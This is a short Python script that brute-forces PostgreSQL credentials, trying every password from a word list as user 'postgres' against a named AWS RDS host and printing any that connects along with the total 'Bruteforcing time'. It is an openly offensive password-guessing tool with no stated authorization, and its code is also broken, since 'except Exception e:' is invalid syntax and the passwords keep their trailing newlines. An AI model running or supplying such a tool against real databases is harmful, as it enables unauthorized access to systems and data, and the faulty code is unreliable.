import psycopg2
import time

host='postgre-db-test.c8ur2wv0ivpl.us-east-1.rds.amazonaws.com'
users_file='users.txt'
passwords_file='passwords.txt'

user_list= open(f'{users_file}',"r")
password_list= open(f'{passwords_file}',"r")

start = time.time()

current_user='postgres'

print(f'Testing user: {current_user}')
# for current_user in user_list:
for current_password in password_list:

    print(f'Testing password: {current_password}')

    try:
        engine = psycopg2.connect(
            database="postgres",
            user=current_user,
            password=current_password,
            host=host,
            port='5432'
        )
    except Exception e:
        continue
    
    print(f'Found: {current_password}')

elapsed = (time.time() - start)
print(f'\nBruteforcing time: {elapsed}')
